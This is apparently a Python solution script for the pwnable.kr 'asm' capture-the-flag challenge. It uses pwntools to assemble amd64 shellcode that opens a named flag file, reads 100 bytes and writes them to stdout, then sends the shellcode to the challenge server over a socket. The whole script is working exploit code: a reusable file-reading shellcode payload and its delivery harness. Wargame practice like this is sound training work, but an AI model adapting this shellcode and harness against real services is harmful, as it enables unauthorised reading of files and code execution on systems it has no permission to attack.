import socket
from time import sleep

from pwnlib import asm

FILE_NAME = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
CONTENT_LENGTH = 100


def compile_read_file_shellcode(file_name: str, content_length: int):
    asm.context.arch = 'amd64'
    return asm.asm(f'''
            jmp start

            main:        
                pop rdi
                push rdi       

                push rbp
                mov rbp, rsp
                sub rsp, {content_length}

                mov rax, 2 
                mov rsi, O_RDONLY 
                mov rdx, S_IRUSR
                syscall
                
                mov rdi, rax
                xor rax, rax
                lea rsi, [rbp - {content_length}]
                mov rdx, {content_length}
                syscall

                mov rax, 1
                mov rdi, 1 
                lea rsi, [rbp - {content_length}]
                mov rdx, {content_length}
                syscall

                mov rsp, rbp
                pop rbp
                ret 

            start:
                call main
                .asciz "{file_name}"
            ''')


def main():
    connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        pwnable_asm_address = ('pwnable.kr', 9026)
        connection_socket.connect(pwnable_asm_address)

        print(connection_socket.recv(1024).decode())
        print(connection_socket.recv(1024).decode())

        # Send shellcode
        shellcode = compile_read_file_shellcode(FILE_NAME, CONTENT_LENGTH)
        connection_socket.send(shellcode)
        print(shellcode)

        sleep(1)

        print(connection_socket.recv(1024))

    finally:
        connection_socket.close()


if __name__ == '__main__':
    main()
